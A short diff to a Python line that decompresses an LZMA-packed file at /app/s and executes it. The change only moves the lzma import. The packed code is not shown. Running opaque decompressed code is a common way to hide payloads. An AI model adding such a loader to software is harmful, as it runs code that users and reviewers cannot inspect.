@@ -1,1 +1,2 @@
-exec(__import__('lzma').decompress(open('/app/s','rb').read()))
+import lzma
+exec(lzma.decompress(open('/app/s','rb').read()))
